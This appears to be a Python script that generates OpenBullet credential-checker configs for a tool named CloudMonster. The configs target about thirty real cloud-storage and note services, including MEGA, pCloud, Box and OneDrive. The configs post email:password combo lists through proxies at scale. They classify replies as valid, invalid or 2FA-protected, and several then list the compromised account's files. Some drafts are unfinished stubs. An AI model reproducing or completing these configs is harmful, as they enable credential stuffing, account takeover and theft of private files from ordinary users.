#!/usr/bin/env python3
"""Regenerate draft .loli files (optional). Run from repo root: python tools/lolicfg/generate_drafts.py"""

from __future__ import annotations

import json
import os

ROOT = os.path.dirname(os.path.abspath(__file__))

SETTINGS_BASE = {
    "SuggestedBots": 100,
    "MaxCPM": 0,
    "LastModified": "2026-01-01T00:00:00.0000000+00:00",
    "AdditionalInfo": "",
    "Author": "CloudMonster",
    "Version": "0.1 draft",
    "LoliSave": False,
    "IgnoreResponseErrors": False,
    "MaxRedirects": 8,
    "NeedsProxies": True,
    "OnlySocks": False,
    "OnlySsl": False,
    "MaxProxyUses": 0,
    "EncodeData": False,
    "AllowedWordlist1": "MailPass",
    "AllowedWordlist2": "MailPass",
    "DataRules": [],
    "CustomInputs": [],
    "CaptchaUrl": "",
    "Base64": "",
    "Grayscale": False,
    "RemoveLines": False,
    "RemoveNoise": False,
    "Dilate": False,
    "Threshold": 1.0,
    "DiffKeep": 0.0,
    "DiffHide": 0.0,
    "Saturate": False,
    "Saturation": 0.0,
    "Transparent": False,
    "OnlyShow": False,
    "ContrastGamma": False,
    "Contrast": 1.0,
    "Gamma": 1.0,
    "Brightness": 1.0,
    "RemoveLinesMin": 0,
    "RemoveLinesMax": 0,
    "ForceHeadless": False,
    "AlwaysOpen": False,
    "AlwaysQuit": False,
    "DisableNotifications": False,
    "CustomUserAgent": "",
    "RandomUA": False,
    "CustomCMDArgs": "",
}

# name, filename, combo, rust module, script body (without leading comments block optional)
DRAFTS: list[tuple[str, str, str, str, str]] = [
    (
        "MEGA",
        "mega.loli",
        "email:password (also email password)",
        "mega.rs (crate mega)",
        """
# MEGA uses native API + curl-impersonate in CloudMonster — not a simple HTTP login.
# Ref: crates/net/src/mega.rs, third_party/mega-0.8
# Edit or replace with your OB MEGA config.

KEYCHECK
  KEYCHAIN Failure OR
    KEY "cloud auth"
""",
    ),
    (
        "Filen",
        "filen.loli",
        "email:password",
        "filen.rs",
        """
# Auth v2: salt -> PBKDF2-SHA512 200000 -> sendPwd (see filen_crypto.rs in Rust)
# OpenBullet 2: use Node Script block from project chat / filen README in providers

REQUEST POST "https://gateway.filen.io/v3/auth/info"
  CONTENT "{{\"email\":\"<USER>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Accept: */*"

PARSE "<SOURCE>" JSON "salt" -> VAR "salt"

# TODO: Script PBKDF2 -> VAR sendPwd (NodeJS crypto.pbkdf2Sync + sha512)

REQUEST POST "https://gateway.filen-4.net/v3/login"
  CONTENT "{{\"email\":\"<USER>\",\"password\":\"<sendPwd>\",\"twoFactorCode\":\"XXXXXX\",\"authVersion\":2}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Accept: */*"

KEYCHECK
  KEYCHAIN Success OR
    KEY "Login successful."
  KEYCHAIN Failure OR
    KEY "Email address or password wrong."
  KEYCHAIN Custom OR
    KEY "Two Factor Authentication"
""",
    ),
    (
        "Degoo",
        "degoo.loli",
        "email:password",
        "degoo.rs",
        """
REQUEST POST "https://rest-api.degoo.com/login"
  CONTENT "email=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://app.degoo.com"
  HEADER "Referer: https://app.degoo.com/"

KEYCHECK
  KEYCHAIN Success OR
    KEY "token"
  KEYCHAIN Failure OR
    KEY "error"

# TODO: access-token/v2 + production-appsync.degoo.com/graphql (list files)
""",
    ),
    (
        "FourShared",
        "four_shared.loli",
        "email:password",
        "four_shared.rs",
        """
REQUEST POST "https://www.4shared.com/web/login"
  CONTENT "login=<USER>&password=<PASS>&returnTo=https://www.4shared.com/account/home.jsp"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Referer: https://www.4shared.com/web/login"

KEYCHECK
  KEYCHAIN Success OR
    KEY "4shared"
  KEYCHAIN Failure OR
    KEY "Invalid"

# TODO: fileList / getTree — may need dcNNN.4shared.com after geo response
""",
    ),
    (
        "Blomp",
        "blomp.loli",
        "email:password",
        "blomp.rs",
        """
REQUEST POST "https://authenticate.blomp.com/v2.0/tokens"
  CONTENT "username=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

KEYCHECK
  KEYCHAIN Success OR
    KEY "access"
  KEYCHAIN Failure OR
    KEY "error"
""",
    ),
    (
        "Files.fm",
        "filesfm.loli",
        "email:password",
        "filesfm.rs",
        """
# Primary: https://api.files.fm — see filesfm.rs for login + list endpoints

REQUEST POST "https://api.files.fm/api/login.php"
  CONTENT "username=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://files.fm"
  HEADER "Referer: https://files.fm/"

KEYCHECK
  KEYCHAIN Success OR
    KEY "session"
  KEYCHAIN Failure OR
    KEY "error"
""",
    ),
    (
        "ADrive",
        "adrive.loli",
        "email:password",
        "adrive.rs",
        """
# WebDAV PROPFIND — needs plan with WebDAV enabled

REQUEST PROPFIND "https://www.adrive.com/webDAV.php/"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Depth: 1"
  # TODO: Basic auth <USER>:<PASS> (OB: Authorization header block)
""",
    ),
    (
        "TeraBox",
        "terabox.loli",
        "email:password",
        "terabox.rs",
        """
# Passport + RSA/AES — multi-step; see terabox.rs
# Base host: https://www.terabox.com

REQUEST GET "https://www.terabox.com/"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: passport login, ndus cookie, /api/list
""",
    ),
    (
        "PixelDrain",
        "pixeldrain.loli",
        "email:password",
        "pixeldrain.rs",
        """
REQUEST POST "https://pixeldrain.com/api/user/login"
  CONTENT "username=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

KEYCHECK
  KEYCHAIN Success OR
    KEY "auth_key"
  KEYCHAIN Failure OR
    KEY "error"

REQUEST GET "https://pixeldrain.com/api/user/files"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  # TODO: auth header from login
""",
    ),
    (
        "Raindrop",
        "raindrop.loli",
        "email:password",
        "raindrop.rs",
        """
REQUEST POST "https://api.raindrop.io/v1/auth/email"
  CONTENT "{{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

KEYCHECK
  KEYCHAIN Success OR
    KEY "access_token"
  KEYCHAIN Failure OR
    KEY "error"

REQUEST GET "https://api.raindrop.io/v1/raindrops/0"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  # TODO: Authorization: Bearer <token>
""",
    ),
    (
        "Internxt",
        "internxt.loli",
        "email:password",
        "internxt.rs",
        """
REQUEST POST "https://gateway.internxt.com/drive/auth/login"
  CONTENT "{{\"email\":\"<USER>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://drive.internxt.com"

# TODO: encrypted password -> /drive/auth/login/access (internxt_crypto.rs)

KEYCHECK
  KEYCHAIN Success OR
    KEY "token"
""",
    ),
    (
        "RemNote",
        "remnote.loli",
        "email:password",
        "remnote.rs",
        """
# Requires REMNOTE_FIREBASE_API_KEY (see tools/REMNOTE-FIREBASE.md)

REQUEST POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=YOUR_FIREBASE_KEY"
  CONTENT "{{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"returnSecureToken\":true}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

KEYCHECK
  KEYCHAIN Success OR
    KEY "idToken"
  KEYCHAIN Failure OR
    KEY "INVALID_PASSWORD"
""",
    ),
    (
        "OneDrive",
        "onedrive.loli",
        "email:password",
        "onedrive.rs",
        """
# Microsoft login.live.com OAuth + POST flow — many redirects (see onedrive.rs)

REQUEST GET "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service%3a%3auser.auth%40live.com%20service%3a%3aonedrive.readwrite%20offline_access&response_type=token&redirect_uri=https://p.sfx.ms/sa.html"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: parse urlPost, submit credentials, capture access_token from fragment

REQUEST GET "https://api.onedrive.com/v1.0/drive/root/children?$select=id,name,size&$top=200"
  # TODO: Authorization: Bearer <access_token>
""",
    ),
    (
        "WPS Drive",
        "wps.loli",
        "email:password",
        "wps.rs",
        """
REQUEST GET "https://account.wps.com/?cb=https://www.wps.com/"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: passkey + safe_verify + drive.wps.cn/api/v3/groups (see wps.rs)

KEYCHECK
  KEYCHAIN Success OR
    KEY "wps"
""",
    ),
    (
        "Sync.com",
        "sync_com.loli",
        "email:password",
        "sync_com.rs",
        """
REQUEST POST "https://cp.sync.com/api/?command=userlogin"
  CONTENT "email=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://cp.sync.com"
  HEADER "Referer: https://cp.sync.com/"

KEYCHECK
  KEYCHAIN Success OR
    KEY "success"
  KEYCHAIN Failure OR
    KEY "error"

# TODO: syncrefresh + list (encrypted names — sync_com_crypto.rs)
""",
    ),
    (
        "Acronis",
        "acronis.loli",
        "email:password",
        "acronis.rs",
        """
REQUEST GET "https://account.acronis.com/api/1/accounts?email=<USER>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: OAuth password grant — auth only in CloudMonster (no file list)
""",
    ),
    (
        "Zoho Notes",
        "zoho_notes.loli",
        "email:app-password",
        "zoho_notes.rs",
        """
# Multi DC: accounts.zoho.com / .eu — see zoho_notes.rs

REQUEST GET "https://accounts.zoho.com/signin?v=2&servicename=ZohoNotebook"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: lookup + password digest signin flow
""",
    ),
    (
        "Obsidian",
        "obsidian.loli",
        "email:password or OBSIDIAN_AUTH_TOKEN",
        "obsidian.rs",
        """
# CloudMonster uses obsidian-headless CLI or token — not simple HTTP login

REQUEST GET "https://api.obsidian.md/vault/list"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  # TODO: Authorization from token
""",
    ),
    (
        "Nimbus Note",
        "nimbus_notes.loli",
        "email:password",
        "nimbus_notes.rs",
        """
REQUEST POST "https://app.nimbusweb.me/v2/api/auth/signin"
  CONTENT "{{\"login\":\"<USER>\",\"password\":\"<PASS>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://app.nimbusweb.me"
  HEADER "Referer: https://app.nimbusweb.me/auth/"

KEYCHECK
  KEYCHAIN Success OR
    KEY "token"

# TODO: GET /v2/api/notes or note/list
""",
    ),
    (
        "Proton Drive",
        "proton_drive.loli",
        "not mail:pass (SRP/2FA)",
        "proton_drive.rs",
        """
# Not checker-ready in CloudMonster GUI — SRP + 2FA
# Placeholder for future OpenBullet research
""",
    ),
    (
        "Koofr",
        "koofr.loli",
        "email:password",
        "koofr.rs",
        """
REQUEST POST "https://app.koofr.com/auth/login"
  CONTENT "email=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://app.koofr.com"

KEYCHECK
  KEYCHAIN Success OR
    KEY "session"
  KEYCHAIN Failure OR
    KEY "error"
""",
    ),
    (
        "UpNote",
        "upnote.loli",
        "upnote:TOKEN (not mail:pass)",
        "upnote.rs",
        """
REQUEST GET "https://api.getupnote.com/v1/notes"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  # TODO: Authorization: Bearer <token from combo after upnote: prefix>
""",
    ),
    (
        "Box",
        "box_com.loli",
        "email:password",
        "box_com.rs",
        """
REQUEST POST "https://account.box.com/api/oauth2/v2/login"
  CONTENT "login=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://account.box.com"

KEYCHECK
  KEYCHAIN Success OR
    KEY "authorization_code"
  KEYCHAIN Failure OR
    KEY "error"

# TODO: token + api.box.com/2.0/folders/0/items
""",
    ),
    (
        "FEX",
        "fex.loli",
        "email:password",
        "fex.rs",
        """
REQUEST POST "https://api.fex.net/api/v1/auth/login"
  CONTENT "{{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://fex.net"

KEYCHECK
  KEYCHAIN Success OR
    KEY "token"
  KEYCHAIN Failure OR
    KEY "error"
""",
    ),
    (
        "file.io",
        "file_io.loli",
        "fileio:API_KEY",
        "file_io.rs",
        """
# Combo: user:fileio:KEY or password part fileio:KEY — see cloud_parser.rs

REQUEST GET "https://www.file.io/?token=<PASS>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: list uploads for API key
""",
    ),
    (
        "Icedrive",
        "icedrive.loli",
        "email:password",
        "icedrive.rs",
        """
REQUEST POST "https://icedrive.net/API/Internal/V1/?request=login"
  CONTENT "username=<USER>&password=<PASS>"
  CONTENTTYPE "application/x-www-form-urlencoded"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://icedrive.net"

KEYCHECK
  KEYCHAIN Success OR
    KEY "token"
  KEYCHAIN Failure OR
    KEY "error"

# Fallback mobile API: https://apis.icedrive.net/v3/mobile/api
""",
    ),
    (
        "MobiDrive",
        "mobidrive.loli",
        "mobidrive:… (special combo)",
        "mobidrive.rs",
        """
REQUEST POST "https://accounts.mobisystems.com/api/auth/login"
  CONTENT "{{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}"
  CONTENTTYPE "application/json"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  HEADER "Origin: https://mobidrive.com"

# TODO: reCAPTCHA on site — see mobidrive.rs
""",
    ),
    (
        "SecureShare",
        "secureshare.loli",
        "secureshare:COOKIE",
        "secureshare.rs",
        """
REQUEST GET "https://secureshare.co/api/shares"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  # TODO: Cookie from combo (secureshare:...)
""",
    ),
    (
        "ToffeeShare",
        "toffeeshare.loli",
        "P2P — not cloud login",
        "toffeeshare.rs",
        """
# Not in CloudMonster Ready list — no mail:pass checker
""",
    ),
    (
        "WorkUpload",
        "workupload.loli",
        "email:password",
        "workupload.rs",
        """
REQUEST GET "https://workupload.com/login"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# TODO: puzzle + captcha + POST https://workupload.com/auth (PoW — workupload.rs)
""",
    ),
    (
        "pCloud",
        "pcloud.loli",
        "email:password",
        "pcloud.rs",
        """
REQUEST GET "https://api.pcloud.com/userinfo?username=<USER>&password=<PASS>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

KEYCHECK
  KEYCHAIN Success OR
    KEY "userid"
  KEYCHAIN Failure OR
    KEY "Log in failed"

REQUEST GET "https://api.pcloud.com/listfolder?username=<USER>&password=<PASS>&folderid=0"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
""",
    ),
]


def settings_block(display_name: str, rust_ref: str, combo: str) -> str:
    s = dict(SETTINGS_BASE)
    s["Name"] = f"CloudMonster — {display_name}"
    s["AdditionalInfo"] = (
        f"Draft combo: {combo}. Rust: crates/net/src/cloud/providers/{rust_ref}"
    )
    return "[SETTINGS]\n" + json.dumps(s, indent=2)


def script_block(combo: str, rust: str, body: str) -> str:
    header = f"""[SCRIPT]
# CloudMonster draft — edit below
# Combo: {combo}
# Rust: crates/net/src/cloud/providers/{rust}
"""
    return header + body.strip() + "\n"


def main() -> None:
    for display, filename, combo, rust, body in DRAFTS:
        path = os.path.join(ROOT, filename)
        with open(path, "w", encoding="utf-8") as f:
            f.write(
                settings_block(display, rust, combo)
                + "\n\n"
                + script_block(combo, rust, body)
            )
        print("wrote", filename)


if __name__ == "__main__":
    main()
